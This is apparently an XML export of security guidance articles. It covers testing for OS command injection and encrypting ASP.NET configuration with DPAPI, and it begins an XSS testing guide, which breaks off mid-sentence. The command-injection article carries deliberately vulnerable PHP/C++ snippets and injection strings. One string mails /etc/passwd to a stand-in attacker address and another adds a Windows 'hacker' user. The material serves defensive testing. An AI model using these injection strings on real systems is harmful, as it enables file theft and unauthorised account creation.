      <Data><![CDATA[<br><h1>Applies to:</h1><ul><li>Programming languages that allow interaction with operating system commands such as C/C++, Java, VB, PHP, Perl, and Python.</li></ul><p>&nbsp;</p><h1>Summary</h1><p>Command injection vulnerabilities are particularly dangerous as they allow unauthorized execution of operating system commands.&nbsp; They exist because applications fail to properly validate and sanitize the parameters they use when invoking shell functions such as system() or exec() to execute system commands.&nbsp;&nbsp; Attackers with control of these parameters can trick the application into executing any system command of their choice.&nbsp; </p><p>For example, a UNIX application lists the contents of a folder using the ls command.&nbsp; It takes the string <em>folder_name</em> from the user and, without any validation, concatenates it to "ls" to build the actual command.&nbsp; The application then passes the command ("ls <em>folder_name</em>") to the system() function and grabs the results.&nbsp; A command injection bug allows an attacker to inject an additional command in the input string<em> folder_name</em>.&nbsp; As a result the application is tricked into executing the attacker’s additional command.</p><p>In order to properly test for command injection vulnerabilities, the following steps should be followed:</p><ul><li>Step 1:&nbsp; Understand Attack Scenarios </li><li>Step 2:&nbsp; Analyze Causes and Countermeasures </li><li>Step 3:&nbsp; Start Testing and Exploring </li><li>Step 4:&nbsp; Fine-tune Test Cases</li></ul><p>&nbsp;</p><h1>Step 1:&nbsp; Understand Attack Scenarios</h1><p>The first step in testing for command injection vulnerabilities is to understand their attack scenarios.&nbsp; There are two common types on command injection bugs:</p><ul><li>Direct command injection. </li><li>Indirect command injection.</li></ul><p><strong><em>&nbsp;</em></strong></p><h2><em>Scenario 1:&nbsp; Direct Command injection</em></h2><p>The most basic form of command injection consists of directly supplying the additional command to the vulnerable application.&nbsp;&nbsp; First the attacker discovers that the application invokes a system command by directly passing user supplied data as arguments to the command.&nbsp;&nbsp;&nbsp; Then the attacker supplies the malicious command as part of the expected arguments.&nbsp; The application executes the original command and then the malicious one. </p><p>In detail:</p><ol><li>Attacker discovers that application uses client input to execute a command. </li><li>Attacker supplies malicious command as part of the client input. </li><li>Attacker observes application executing additional command.</li></ol><p>&nbsp;</p><h2><em>Scenario 2:&nbsp; Indirect Command injection</em></h2><p>This case of command injection consists of indirectly supplying the additional command to the vulnerable application possibly through a file or an environment variable.&nbsp;&nbsp;&nbsp;&nbsp; First the attacker deducts that the application invokes a system command using data from an external source such as a file or an environment variable.&nbsp; The attacker then modifies the contents of the external source to add a malicious command.&nbsp;&nbsp; Then the attacker waits or forces the application to execute the malicious command along with the original one.</p><p>In detail:</p><ol><li>Attacker discovers that application uses data stored in an external source to execute a command. </li><li>Attacker edits the external source to include malicious command. </li><li>Attacker waits until the application executes the original command (or attacker attempts to bring the application to a state in which it will execute the command supplied). </li><li>Attacker verifies that the application executes the injected command.</li></ol><p><strong></strong>&nbsp;</p><h1>Step 2:&nbsp; Analyze Causes and Countermeasures</h1><p>During this step you will understand the cause of command injection bugs as well as common defenses.&nbsp;&nbsp;&nbsp;&nbsp; This will help you look for bugs in code and recognize safe coding practices.</p><p>&nbsp;</p><h2><em>Command Injection Causes</em></h2><p>There is one single cause for command injection bugs: poor input validation.&nbsp; Any application that builds command strings using non-sanitized data is vulnerable to this bug. .&nbsp; The following code snippets demonstrate command injection vulnerabilities. This PHP code running in Windows uses the input supplied by a text box in a form and invokes the exec function to type the file: </p><pre>&lt;?php<br>&nbsp;<br>&nbsp; $command = 'type ' . $_POST['username'];<br>&nbsp; exec($command, $res);&nbsp; <br>&nbsp;<br>&nbsp; for ($i = 0; $i &lt; sizeof($res); $i++) <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo $res[$i].'&lt;br&gt;';<br>&nbsp;<br>?&gt;&nbsp;</pre><p>A user can supply the following string to see the list of active connections in the server:</p>
<pre>file.txt|netstat -ano</pre><br><p>The following example in C++ (courtesy of OWASP [i]) runs in a POSIX compliant environment such as a Unix variant.&nbsp; It uses input supplied by the command line to system and runs the cat command:</p>
<pre>#include &lt;stdio.h&gt;<br>#include &lt;unistd.h&gt;<br>&nbsp;<br>int main(int argc, char **argv) {<br>&nbsp;<br>&nbsp;char cat[] = "cat ";<br>&nbsp;char *command;<br>&nbsp;size_t commandLength;<br>&nbsp;<br>&nbsp;commandLength = strlen(cat) + strlen(argv[1]) + 1;<br>&nbsp;command = (char *) malloc(commandLength);<br>&nbsp;strncpy(command, cat, commandLength);<br>&nbsp;strncat(command, argv[1], (commandLength - strlen(cat)) );<br>&nbsp;<br>&nbsp;system(command);<br>&nbsp;return (0);<br>&nbsp;<br>}</pre><p>A user can supply the following string to list the contents of the see the contents of the server’s current directory:</p><pre><strong>file.txt;ls</strong></pre><p>The code snippets above use two different functions that interact with the shell named exec() and system().&nbsp; The following list compiles popular functions attacked during command injection:&nbsp;</p><table><tbody><tr><td><pre><strong>Function</strong></pre></td><td><pre><strong>Language</strong></pre></td></tr><tr><td><pre>system, execlp,execvp, ShellExecute, _wsystem</pre></td><td><pre>C/C++</pre></td></tr><tr><td><pre>Runtime.exec</pre></td><td><pre>Java</pre></td></tr><tr><td><pre>exec, eval</pre></td><td><pre>PHP</pre></td></tr><tr><td><pre>exec, open, eval, </pre></td><td><pre>Perl</pre></td></tr><tr><td><pre>exec, eval, execfile, input</pre></td><td><pre>Python</pre></td></tr><tr><td><pre>Shell, ShellExecuteForExplore, ShellExecute</pre></td><td><pre>VB</pre></td></tr></tbody></table><pre>&nbsp;</pre><h2><em>Command Injection Countermeasures</em></h2><p>Applications defend against command injection bugs by doing proper input validation and sanitization.&nbsp;&nbsp; Developers must look for all instances where the application invokes a shell-like system function such as exec or system and avoid executing them unless the parameters have been properly validated and sanitized.&nbsp;&nbsp; There are two possible ways to validate these parameters: using black lists or using white lists.&nbsp; </p><p>Black lists check for malicious patterns before allowing execution.&nbsp; In case of command injection, a black list might contain command delimiters such as a semicolon (;)vertical dash (|), double dash (||), double amp (&amp;&amp;) as well as dangerous commands such as rm, cp, cat, ls, at, net, netstat, del, copy, etc.&nbsp; However, a major drawback impedes this countermeasure from being effective; unless the black list covers absolutely all dangerous possibilities, the adversary can find a variation outside of the black list to carry an attack.&nbsp; &nbsp;&nbsp;</p><p>White lists match against safe execution patterns.&nbsp; If the data in question doesn’t match any of the safe patterns it is disallowed.&nbsp; This solves the problem of new variations of dangerous constructs since any new (malicious) construct that doesn’t match a safe one is automatically blocked.&nbsp; A common way to implement white lists is to match the input against a regular expression that indicates the safe format for the command.&nbsp; However, regular expressions can be complex to write and interpret.&nbsp; Developers must make sure they understand well how to write and interpret regular expressions before implementing this defense.</p><p>&nbsp;</p><h1>Step 3:&nbsp; Start Testing and Exploring</h1><p>During this step you will start testing your application with basic command injection strings and observing how the application reacts.</p><h2><em>Start with a simple test string</em></h2><p>First, you need to find all the places where your application invokes a system command to perform and operation.&nbsp; Then on each of these places, start exploring how the application handles the basic characters needed for command injection.&nbsp;&nbsp;&nbsp; The following two strings are good to try as they contain both commands and command injection characters: </p><pre>abc;dir C:|xyz&amp;netstat&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (Windows)</pre><pre>abc;ls|cp&amp;rm&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (UNIX)</pre><p>If the application doesn’t give an error message because of the special characters then there is a chance that it suffers from a command injection bug.</p><p>&nbsp;</p><h2><em>Build a valid command</em></h2><p>It is important that you are able to comprehend.&nbsp; For example, a <em>file not found</em> error rather than an <em>invalid data format</em> error is a good hint that the application is processing the special characters as part of the file.&nbsp; For example, you might get a file not found error when using the following string:</p><pre><strong>file.txt|dir c:</strong></pre><p>This is because the application is calling exec() with the following string:</p><pre>cmd /c type "c:\public_html\user_files\<strong>file.txt|dir c:</strong>" </pre><p>For the input string to execute the directory listing command you need to close the double quotes before appending the extra command:</p><pre>file.txt<strong>"</strong>|dir c:</pre><p>Pay extra attention to quotes and double quotes since omitting them can easily result in the injection string treated as data. </p><p>Sometimes the application doesn’t reflect the output of the injected command on screen. To get around this, use a command that doesn’t create screen output but that performs a visible action:</p><table><tbody><tr><td><pre>file.txt;mail attacker@attacker.org &lt;/etc/passwd</pre><pre>&nbsp;</pre></td><td><pre>Emails attacker the server’s passwords.</pre></td></tr><tr><td><pre>file.txt|net user /add "hacker"</pre><pre>&nbsp;</pre></td><td><pre>Adds hacker to the Windows user database.</pre></td></tr><tr><td><pre>file.txt;ping%20attacker_site</pre></td><td><pre>Pings the attacker site.</pre></td></tr></tbody></table><pre>&nbsp;&nbsp;</pre><h1>Step 4:&nbsp; Fine-tune Test Case Data</h1><p>To thoroughly test your application against command injection bugs, you must cover all possible entry points and scenarios where command injection is possible.</p><h2><em>Try different entry points and scenarios</em></h2><p>Continue exploring the different entry points of the application.&nbsp; The format of the test case data will vary depending on the entry point.&nbsp; For example if you are testing through the URL the string file.txt"|dir c: might look like one of the two below (depending on the URL encoding):</p><ul><li><pre>file.txt"|dir%20c: </pre></li><li><pre>file.txt"|dir+c:&nbsp;</pre></li></ul><p>It is important that you consider different encodings and data format for additional command injection entry points such as: input fields, URL parameters, POST data, web service methods, user interface elements, environment variables, database contents, registry contents, file contents, third party APIs, and network packets.</p><p>When testing for indirect command injection it is important that you control the source of the parameters passed to the target function. &nbsp;&nbsp;For example, if you are attacking an application using execfile as the target functionthen you must control the file passed to this function.&nbsp; Let’s say the application uses execfile /private/commands.txt. Here you don’t need to pass any malicious parameters; you must modify the commands file to inject malicious commands and wait for (or force) the injected command to execute. It is recommended that, when testing for indirect injection, you use an environment monitoring tool.&nbsp;&nbsp; You can use Sysinternals <em>Process Explorer</em> that now combines registry, file system, and environment variable monitoring to find out the external sources your application uses when invoking shell or system commands.</p><p>&nbsp;</p><h1>Conclusions</h1><p>Command injection bugs exist because of poor input validation and sanitization on the parameters used by functions that interact with the operating system shell.&nbsp;&nbsp; Any attacker with control of these parameters can force the application to execute unwanted system commands.&nbsp; Testing against command injection bugs consists of manipulating the original command parameters with different combinations of command injection strings that vary depending on the action to perform and the entry point under test.</p><p>&nbsp;</p><p><br>&nbsp;</p><br><hr><br><p>[i] <strong>Command Injection</strong>. OWASP. <a href="http://www.owasp.org/index.php/Command_Injection">http://www.owasp.org/index.php/Command_Injection</a></p><p>&nbsp;</p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="1645669308" Content_Hash="-1197103867">
    <Metadata>
      <Id>8617d36b-a715-4a8b-91c2-eb8064e9df15</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>How to Encrypt Configuration Sections in ASP.NET Using DPAPI</Title>
      <Category>Configuration</Category>
      <Phase>Implementation</Phase>
      <Technology>ASP.NET</Technology>
      <Type>How To</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority />
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>Summary&nbsp;</h1><p>This How to shows how to use the Windows Data Protection application programming interface (DPAPI) protected configuration provider and the Aspnet_regiis.exe tool to encrypt sections of your configuration files. You can use the Aspnet_regiis.exe tool to encrypt sensitive data, such as connection strings, held in the Web.config and Machine.config files. The DPAPI protected configuration provider supports machine-level and user-level stores for key storage. The choice of store depends largely on whether or not your application shares a server with other applications and whether or not sensitive data must be kept private for each application. Note that if your application is deployed in a Web farm, you should use the RSA protected configuration provider due to the ease with which RSA keys can be exported.</p><h1>Contents</h1><ul><li>Objectives </li><li>Overview </li><li>Summary of Steps </li><li>Step 1. Identify the Configuration Sections to be Encrypted </li><li>Step 2. Choose the Machine or User Store </li><li>Step 3. Encrypt Your Configuration File Data </li><li>Web Farm Scenarios </li><li>Additional Resources</li></ul><h1>Objectives</h1><ul><li>Know which sections can and cannot be encrypted with the DPAPI protected configuration provider. </li><li>Choose between user-level and machine-level DPAPI key storage. </li><li>Use the DPAPI protected configuration provider to encrypt sections of your configuration file. </li><li>Learn about the Web farm restrictions. </li></ul><h1>Overview</h1><p>Configuration files such as the Web.config file are often used to hold sensitive information, including user names, passwords, database connection strings, and encryption keys. If you do not protect this information, your application is vulnerable to attackers or malicious users obtaining sensitive information such as account user names and passwords, database names and server names. The sections that usually contain sensitive information that you need to encrypt are the following:</p><ul><li>&lt;appSettings&gt;. This section contains custom application settings. </li><li>&lt;connectionStrings&gt;. This section contains connection strings. </li><li>&lt;identity&gt;. This section can contain impersonation credentials. </li><li>&lt;sessionState&gt;. The section contains the connection string for the out-of-process session state provider. </li></ul><p>Encrypting and decrypting data incurs performance overhead. To keep this overhead to a minimum, encrypt only the sections of your configuration file that store sensitive data.</p><h1>Summary of Steps</h1><p>To encrypt configuration sections by using the DPAPI data protection provider, perform the following steps: </p><ul><li>Step 1. Identify the configuration sections to be encrypted. </li><li>Step 2. Choose the machine or user store. </li><li>Step 3. Encrypt your configuration file data. </li></ul><h1>Step 1. Identify the Configuration Sections to Be Encrypted</h1><p>Encrypting and decrypting data incurs performance overhead. To keep this overhead to a minimum, encrypt only the sections of your configuration file that store sensitive data.</p><h2>Sections You Cannot Encrypt Using Protected Configuration</h2><p>If you store sensitive data in any of the following configuration sections, you cannot encrypt it by using protected configuration and the Aspnet_regiis.exe tool: </p><ul><li>&lt;<strong>processModel</strong>&gt; </li><li>&lt;<strong>runtime</strong>&gt; </li><li>&lt;<strong>mscorlib</strong>&gt; </li><li>&lt;<strong>startup</strong>&gt; </li><li>&lt;<strong>system.runtime.remoting</strong>&gt; </li><li>&lt;<strong>configProtectedData</strong>&gt; </li><li>&lt;<strong>satelliteassemblies</strong>&gt; </li><li>&lt;<strong>cryptographySettings</strong>&gt; </li><li>&lt;<strong>cryptoNameMapping</strong>&gt; </li><li>&lt;<strong>cryptoClasses</strong>&gt; </li></ul><p>For the configuration sections listed, you should use the Aspnet_setreg.exe tool, which is also available for previous versions of the .NET Framework. </p><p>For more information about using the Aspnet_setreg tool to encrypt data in these configuration sections, see Microsoft Knowledge Base article 329290, How to use the ASP.NET utility to encrypt credentials and session state connection strings.</p><h1>Step 2. Choose the Machine or User Store</h1><p>The <strong>DataProtectionConfigurationProvider</strong> supports machine-level and user-level stores for key storage. The choice of store depends largely on whether or not your application shares a server with other applications and whether or not sensitive data must be kept private for each application.</p><blockquote><strong>Note</strong>&nbsp;&nbsp;&nbsp;For information on where the user key is stored, see: <a href="http://msdn.microsoft.com/library/default.asp?url=/library/en-us/dnsecure/html/windataprotection-dpapi.asp">Windows Data Protection</a>.</blockquote><h2>Machine Store</h2><p>Use machine-level key storage in the following situations: </p><ul><li>Your application runs on its own dedicated server with no other applications. </li><li>You have multiple applications on the same server that run and you want those applications to be able to share sensitive information. </li></ul><h2>User Store</h2><p>Use user-level key storage if you run your application in a shared hosting environment and you want to make sure that your application's sensitive data is not accessible to other applications on the server. In this situation, each application should run under a separate identity, and the resources for the application—such as files and databases—should be restricted to that identity.</p><h1>Step 3. Encrypt Your Configuration File Data</h1><p>This step shows you how to encrypt a connection string in the Web.config file, first with the machine store and then with the user store.</p><h2>Using DPAPI with the Machine Store to Encrypt a Connection String in Web.config</h2><p>By default, the <strong>DataProtectionConfigurationProvider</strong> is configured to use DPAPI with the machine store. </p><h3>To encrypt the connectionStrings section in Web.config </h3><ol><li>Create a new Web site named MachineDPAPI. Make sure that this directory is configured as a virtual directory. </li><li>Add a Web.config configuration file to this directory. </li><li>Add a sample <strong>connectionString</strong> similar to the following example. <div><pre>&lt;connectionStrings&gt;<br>&nbsp; &lt;add name="MyLocalSQLServer" <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; connectionString="Initial Catalog=aspnetdb;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; data source=localhost;Integrated Security=SSPI;" <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; providerName="System.Data.SqlClient"/&gt;<br>&lt;/connectionStrings&gt;  </pre></div></li><li>To encrypt the <strong>connectionStrings</strong> section, run the following command from a .NET command prompt: <p><strong>aspnet_regiis -pe "connectionStrings" -app "/MachineDPAPI" -prov "DataProtectionConfigurationProvider"</strong> </p></li></ol><p>The above command with the <strong>-app</strong> switch assumes that there is an IIS virtual directory called MachineDPAPI. If you are using the Visual Studio Web server instead of IIS, use the <strong>-pef</strong> switch, which allows you to specify the physical directory location of your configuration file.</p><p><strong>aspnet_regiis.exe -pef "connectionStrings" C:\Projects\MachineDPAPI -prov "DataProtectionConfigurationProvider"</strong></p><blockquote><strong>Note</strong>&nbsp;&nbsp;&nbsp;The Aspnet_regiis.exe utility tool is located in the following directory:</blockquote><blockquote>%WinDir%\Microsoft.NET\Framework\&lt;<em>versionNumber</em>&gt;</blockquote><ul><li>The <strong>-pe</strong> switch specifies the configuration section to encrypt. </li><li>The <strong>-pef</strong> switch specifies the configuration section to encrypt and allows you to supply the physical directory path for your configuration file. </li><li>The <strong>-app</strong> switch specifies your Web application's virtual path. If it is a nested application, you need to specify the nested path from the root directory; for example, <strong>"/test/aspnet/MachineDPAPI"</strong>. </li><li>The <strong>-prov</strong> switch specifies the provider name. <p>If the command is successful, you will see the following output: </p><div><pre>Encrypting configuration section...Succeeded!  </pre></div><blockquote><strong>Note</strong>&nbsp;&nbsp;&nbsp;The DPAPI machine key is stored at the following location:</blockquote><blockquote>%windir%\system32\Microsoft\Protect\S-1-5-18</blockquote></li></ul><ol><li>Review the Web.config file, and examine the changes. The following elements are created: <ul><li>&lt;<strong>EncryptedData</strong>&gt; </li><li>&lt;<strong>CipherData</strong>&gt; </li><li>&lt;<strong>CipherValue</strong>&gt; </li></ul><p>Your modified Web.config file, with the <strong>connectionStrings</strong> section encrypted, should be similar to the following example. </p><div><pre>...<br>&lt;connectionStrings configProtectionProvider="DataProtectionConfigurationProvider"&gt; <br>&nbsp; &lt;EncryptedData&gt;<br>&nbsp;&nbsp;&nbsp; &lt;CipherData&gt;<br>&lt;CipherValue&gt;AQAAANCMnd8BFdERjHoAwE/Cl+sBAAAAexuIJ/8oFE+sGTs7jBKZdgQAAAACAAAAAAADZgAAqAAAA<br>BAAAAA<br>Kms84dyaCPAeaSC1dIMIBAAAAAASAAACgAAAAEAAAAKaVI6aAOFdqhdc6w1Er3HMwAAAAcZ00MZOz1dI7kYRvkMIn/<br>BmfrvoHNUwz6H9rcxJ6Ow41E3hwHLbh79IUWiiNp0VqFAAAAF2sXCdb3fcKkgnagkHkILqteTXh&lt;/CipherValue&gt;<br>&nbsp;&nbsp;&nbsp; &lt;/CipherData&gt;<br>&nbsp; &lt;/EncryptedData&gt;<br>&lt;/connectionStrings&gt;<br>...</pre></div></li><li>Add the following Default.aspx Web page to your application's virtual directory, and then browse to this page to verify that encryption and decryption worked correctly. <div><pre>&lt;%@ Page Language="C#" %&gt;<br><br>&lt;script runat="server"&gt;<br>&nbsp;&nbsp;&nbsp; protected void Page_Load(object sender, EventArgs e)<br>&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Response.Write("Clear text connection string is: " + <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ConfigurationManager.ConnectionStrings<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ["MyLocalSQLServer"].ConnectionString);<br>&nbsp;&nbsp;&nbsp; }<br>&lt;/script&gt;<br>&lt;html&gt;<br>&nbsp; &lt;body/&gt;<br>&lt;/html&gt;  </pre></div></li><li><p>MyLocalSQLServer is the name of the connection string that you previously specified in the Web.config file. </p></li><li>To change the <strong>connectionStrings</strong> section back to clear text, run the following command from the command prompt: <p><strong>aspnet_regiis -pd "connectionStrings" -app "/MachineDPAPI"</strong> </p><p>If the command is successful, you will see the following output: </p><div><pre>Decrypting configuration section...<br>Succeeded!</pre></div></li></ol><p>To decrypt the <strong>connectionStrings</strong> section specifying a physical path to your application's configuration file, use the <strong>-pdf</strong> switch as shown here.</p><p><strong>aspnet_regiis -pdf "connectionStrings" C:\Projects\MachineDPAPI</strong></p><h2>Using DPAPI with a User Store to Encrypt a Connection String in Web.Config</h2><p>By default, the ASP.NET applications run under the NT AUTHORITY\Network Service account. When you access encrypted configuration sections using DPAPI with the user store, make sure that your application is running with the same user identity as the account you used to encrypt the data.</p><p>Using the <strong>DataProtectionConfigurationProvider</strong> and DPAPI with the user store requires a small amount of additional configuration in the Web.config file.</p><h3>To encrypt the connectionStrings section in Web.config </h3><ol><li>Create a new Web site named UserDPAPI. Make sure that this directory is configured as a virtual directory. </li><li>Add a Web.config configuration file to this directory. </li><li>Add a sample <strong>connectionString</strong> similar to the following example. <div><pre>&lt;connectionStrings&gt;<br>&nbsp; &lt;add name="MyLocalSQLServer" connectionString="Initial Catalog=aspnetdb;<br>data source=localhost;Integrated Security=SSPI;" providerName="System.Data.SqlClient"/&gt;<br>&lt;/connectionStrings&gt;  </pre></div></li><li>Add and configure a protected configuration provider to use the user store. To do this, add the following &lt;<strong>configProtectedData</strong>&gt; section. You must set <strong>useMachineProtection</strong>=<strong> "false"</strong> to instruct the provider to use the user store. You must also use a unique provider name, or a run-time error will occur. <div><pre>&lt;configProtectedData&gt;<br>&nbsp; &lt;providers&gt;<br>&nbsp;&nbsp;&nbsp; &lt;add useMachineProtection="false" keyEntropy="" name="MyUserDataProtectionConfigurationProvider" <br>type="System.Configuration.DpapiProtectedConfigurationProvider, System.Configuration,<br>     Version=3.5.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" /&gt;<br>&nbsp; &lt;/providers&gt;<br>&lt;/configProtectedData&gt;  </pre></div></li><li>Run the following command from a command prompt to encrypt the <strong>connectionStrings</strong> section: <p><strong>Aspnet_regiis -pe "connectionStrings" -app "/UserDPAPI" -prov "MyUserDataProtectionConfigurationProvider"</strong> </p><ul><li>The -<strong>pe</strong> switch specifies the configuration section to encrypt. </li><li>The -<strong>app</strong> switch specifies your Web application's virtual path. If it is a nested application, you need to specify the nested path from the root directory; for example: <strong>"/test/aspnet/UserDPAPI"</strong>. </li><li>The -<strong>prov</strong> switch specifies the provider name. In this case, this is set to <strong>"MyUserDataProtectionConfigurationProvider"</strong> which is the name you specified when configuring the provider in the step 3. </li></ul><p>If the command is successful, you will see the following output: </p><div><pre>Encrypting configuration section...Succeeded!</pre></div><blockquote><strong>Note</strong>&nbsp;&nbsp;&nbsp;For information on where the user key is stored, see: <a href="http://msdn.microsoft.com/library/default.asp?url=/library/en-us/dnsecure/html/windataprotection-dpapi.asp">http://msdn.microsoft.com/library/default.asp?url=/library/en-us/dnsecure/html/windataprotection-dpapi.asp</a></blockquote></li></ol><p>Because your application must access the data by using the same identity that you used to encrypt the data, you may need to run the encryption command using your application's service account identity. To do so, you can start a command window by using the <strong>runas</strong> command, specifying an appropriate domain and user name, as follows:</p><p><strong>Runas /profile /user:domain\user cmd</strong></p><p>When you run Aspnet_regiis from the resulting command window, it will use the specified identity to perform the encryption. This enables your application that uses the same identity to decrypt the data at run time. </p><ol><li>Review the Web.config file, and examine the changes. The following elements are created: <ul><li>&lt;<strong>EncryptedData</strong>&gt; </li><li>&lt;<strong>CipherData</strong>&gt; </li><li>&lt;<strong>CipherValue</strong>&gt; </li></ul><p>Your modified Web.config file, with the <strong>connectionStrings</strong> section encrypted should be similar to the following example. </p><div><pre>...<br>&lt;connectionStrings configProtectionProvider="MyUserDataProtectionConfigurationProvider"&gt;<br>&nbsp;&nbsp;&nbsp; &lt;EncryptedData&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;CipherData&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;CipherValue&gt;AQAAANCMnd8BFdERjHoAwE/Cl+sBAAAAWuizHyLxzk+U4/8NnMRAjQAAAAACAAAAA<br>AADZgAAqAAAABAAAADLFqu00qT0BeGh6wmHHGySAAAAAASAAACgAAAAEAAAAM56z6ezglmufZGcta83RKGgAQAA<br>tvDpExhD6h95lfWBt0FqZYzxupI2IepH/XlhLB5rsuuQDCJUL7XGIIsaVW2oNQxgNCPXxRSuCxHQ7vqgbh4G7xH<br>k0wdyws5Ax4T/RYJbfYEF5KAPzShdmdoZdkY/FOWrVEgAr7LzKFBoDcPJBvgX+lfsJdBNeWRB5BqRX552dUFjtDl<br>p8u3K/dA9twWDU2w/cRLMXJtVZ/y/ICI1fzXjX3u7sY9K1IC+5Hbi7nouCK6Ze5RLBnL0Zfdq0PyGlj2To4ftAYA<br>T0SzkBaxlXRQSzMhX+7c+rgKpMqtG9XjAW26x3IJAp2/uAr2zOZqH+tskamHYSruhTicHJDTtP+r6Rs21y2QkRT9<br>Hb9oPd9B5mDIzGtDkifWBbmwLv4XFuYcna1Zgny7McSxMI62jxayVlZKcS5dXV0shwLoUjbTDcXQmFKsRvo2sCW8<br>6wcN8ad02jhKCQMf9SWnZpd849mlqgMFiQQSFlZ6Q+vJLrXqVb8zmVZemQPQcY/DktgjOvjn0iOZ3zhl20fRENOa<br>3ZIWvvK8p9pblz3sEfS19MAW0JtYUAAAAayvNPot3An7LaCTdFYrEip+fTU4=&lt;/CipherValue&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/CipherData&gt;<br>&nbsp;&nbsp;&nbsp; &lt;/EncryptedData&gt;<br>&nbsp; &lt;/connectionStrings&gt;<br>...</pre></div></li><li>Add the following Default.aspx Web page to your application's virtual directory, and then browse to this page to verify that encryption and decryption work correctly. <div><pre>&lt;%@ Page Language="C#" %&gt;&lt;script runat="server"&gt;<br>&nbsp; protected void Page_Load(object sender, EventArgs e)<br>&nbsp; {<br>&nbsp;&nbsp;&nbsp; Response.Write("Clear text connection string is: " + <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ConfigurationManager.ConnectionStrings<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ["MyLocalSQLServer"].ConnectionString);<br>&nbsp; }<br>&lt;/script&gt;<br>&lt;html&gt;<br>&nbsp; &lt;body/&gt;<br>&lt;/html&gt;  </pre></div><p>MyLocalSQLServer is the name of the connection string that you previously specified in the Web.config file. </p><p>Then, in the Web.config file, you need to enable impersonation as shown in the following example. </p><div><pre>&lt;system.web&gt;<br>&nbsp; ...<br>&nbsp; &lt;identity impersonate="true" /&gt;<br>&nbsp; ...<br>&lt;/system.web&gt;  </pre></div></li><li><p>If your application runs under a different account than the one used to encrypt the data, ASP.NET will be unable to access the user store where the DPAPI key is held and will generate the following error: </p><div><pre>Failed to decrypt using provider 'MyUserDataProtectionConfigurationProvider'.<br>&nbsp;Error message from the provider: Key not valid for use in specified state. <br>(Exception from HRESULT: 0x8009000B)  </pre></div></li><li>To change the <strong>connectionStrings</strong> section back to clear text, run the following command from the command prompt: <p><strong>aspnet_regiis -pd "connectionStrings" -app "/UserDPAPI"</strong> </p><p>If the command is successful, you will see the following output: </p><div><pre>Decrypting configuration section...<br>Succeeded!  </pre></div></li></ol><h1>Web Farm Scenarios</h1><p>If you want to deploy the same encrypted configuration file on multiple servers in a Web farm, you should use the <strong>RSAProtectedConfigurationProvider</strong>. This provider makes it easy for you encrypt the data on one server computer and then export the RSA private key needed to decrypt the data. You can then deploy the configuration file and the exported key to the target servers, and then re-import the keys.</p><hr><p>Adapted from Microsoft patterns &amp; practices guidance.</p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="965848737" Content_Hash="-216335988">
    <Metadata>
      <Id>9529c82f-dbc3-4c73-b1d3-6e47448fa6bc</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>How to Test for Cross-Site Scripting (XSS) Bugs</Title>
      <Category>Input and Data Validation</Category>
      <Phase>Implementation</Phase>
      <Technology> Any</Technology>
      <Type>How To</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>1</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<br><br><h1>Applies to</h1><p>XSS bugs affect applications that manipulate HTML input and output.&nbsp; In particular web applications developed in ASP, ASP .NET, PHP, PERL, Java, and Visual Basic.</p><h1>Summary</h1><p>Cross site scripting (or XSS) is a well known HTML-related security vulnerability that commonly affects Internet clients through XSS vulnerable servers.&nbsp; A XSS bug in a web server allows an attacker to send malicious payload to a victim browser such as IE, Firefox, or Netscape through the vulnerable server.&nbsp; &nbsp;Payloads may also execute in other HTTP clients not necessarily focused at browsing the web as long as they render HTML and execute any execute scripts. </p><p>Below is a summary of steps needed for testing for XSS bugs</p><ul><li><strong>Step 1</strong>:&nbsp; Understand XSS attack scenarios</li><li><strong>Step 2</strong>:&nbsp; List high risk components<strong> </strong>and<strong> </strong>entry points</li><li><strong>Step 3</strong>:&nbsp; Start testing and exploring</li><li><strong>Step 4</strong>:&nbsp; Tune test case data</li></ul><p><strong>Step1:&nbsp; Understand XSS Attack Scenarios</strong></p><p>There are two types of XSS: reflective and persistent.&nbsp; A reflective XSS bug occurs when the web server takes input from a visitor and automatically sends him back the input without checking if the data inputted contains a script.&nbsp; Thus, the input data is 